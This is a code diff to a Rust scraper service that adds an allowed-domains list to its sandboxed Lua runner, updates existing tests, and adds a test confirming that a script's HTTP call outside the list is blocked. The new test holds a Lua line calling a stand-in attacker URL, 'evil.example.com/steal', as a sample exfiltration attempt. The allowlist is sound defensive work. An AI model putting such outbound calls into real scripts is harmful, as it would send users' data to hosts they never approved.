@@ -58,6 +58,7 @@ impl Service for ScrapersClient {
         debug_http_dump: bool,
         wreq_emulation: bool,
         follow_redirects: bool,
+        allowed_domains: Vec<String>,
     ) -> Result<()> {
         let cookies = self.cookies.load(name).await?;
         let session_data = self.session.load(name).await?;
@@ -87,6 +88,7 @@ impl Service for ScrapersClient {
                 debug_http_dump,
                 wreq_emulation,
                 follow_redirects,
+                allowed_domains,
             )
         })
         .await
@@ -140,6 +142,7 @@ fn run_script(
     debug_http_dump: bool,
     wreq_emulation: bool,
     follow_redirects: bool,
+    allowed_domains: Vec<String>,
 ) -> Result<(Value, Vec<Cookie>, Result<()>)> {
     let lua = sandboxed_lua().context("building sandboxed lua vm")?;
     // Built fresh per run, same as the Lua VM itself: there's no persisted
@@ -163,6 +166,7 @@ fn run_script(
         debug_http_dump,
         wreq_emulation,
         follow_redirects,
+        allowed_domains,
     )
     .context("installing host functions into the Lua VM")?;
 
@@ -309,7 +313,15 @@ mod tests {
         let client = client(cookies, session, MockDocumentsService::new());
 
         client
-            .run("didaxis", TRIVIAL_SCRIPT, json!({}), false, true, true)
+            .run(
+                "didaxis",
+                TRIVIAL_SCRIPT,
+                json!({}),
+                false,
+                true,
+                true,
+                Vec::new(),
+            )
             .await
             .unwrap();
     }
@@ -341,6 +353,7 @@ mod tests {
                 false,
                 true,
                 true,
+                Vec::new(),
             )
             .await
             .unwrap();
@@ -371,7 +384,7 @@ mod tests {
         "#;
 
         let result = client
-            .run("didaxis", script, json!({}), false, true, true)
+            .run("didaxis", script, json!({}), false, true, true, Vec::new())
             .await;
 
         assert!(result.is_err());
@@ -410,7 +423,7 @@ mod tests {
         "#;
 
         client
-            .run("didaxis", script, json!({}), false, true, true)
+            .run("didaxis", script, json!({}), false, true, true, Vec::new())
             .await
             .unwrap();
 
@@ -441,7 +454,15 @@ mod tests {
         let client = client(cookies, session, MockDocumentsService::new());
 
         let result = client
-            .run("didaxis", "return {}", json!({}), false, true, true)
+            .run(
+                "didaxis",
+                "return {}",
+                json!({}),
+                false,
+                true,
+                true,
+                Vec::new(),
+            )
             .await;
 
         assert!(result.is_err());
@@ -498,9 +519,44 @@ mod tests {
         "#;
 
         let result = client
-            .run("didaxis", script, json!({}), false, true, true)
+            .run("didaxis", script, json!({}), false, true, true, Vec::new())
             .await;
 
         assert!(result.is_err());
+    }
+
+    #[tokio::test]
+    async fn run_blocks_an_http_call_to_a_domain_outside_allowed_domains() {
+        let mut cookies = MockCookiesService::new();
+        cookies.expect_load().returning(|_| Ok(Vec::new()));
+        cookies.expect_save().returning(|_, _| Ok(()));
+        let mut session = MockSessionService::new();
+        session.expect_load().returning(|_| Ok(json!({})));
+        session.expect_save().returning(|_, _| Ok(()));
+
+        let client = client(cookies, session, MockDocumentsService::new());
+
+        let script = r#"
+            local M = {}
+            function M.run(parameters)
+                fyde.http.get("https://evil.example.com/steal")
+            end
+            return M
+        "#;
+
+        let result = client
+            .run(
+                "didaxis",
+                script,
+                json!({}),
+                false,
+                true,
+                true,
+                vec!["allowed.example.com".to_string()],
+            )
+            .await;
+
+        let err = result.unwrap_err().to_string();
+        assert!(err.contains("evil.example.com"), "unexpected error: {err}");
     }
 }
